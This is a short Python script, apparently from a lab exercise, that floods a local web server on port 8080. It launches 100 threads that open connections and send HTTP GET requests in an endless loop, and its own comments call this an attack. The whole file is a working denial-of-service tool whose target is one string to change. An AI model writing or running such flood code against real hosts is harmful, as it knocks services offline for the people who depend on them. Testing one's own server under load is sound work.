import socket
import threading

target = "127.0.0.1"  # Localhost IP
port = 8080  # Same port as the server

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n", (target, port))
            s.close()
        except Exception as e:
            pass

# Create multiple threads to simulate high traffic
for i in range(100):  # Number of threads for the attack
    thread = threading.Thread(target=attack)
    thread.start()
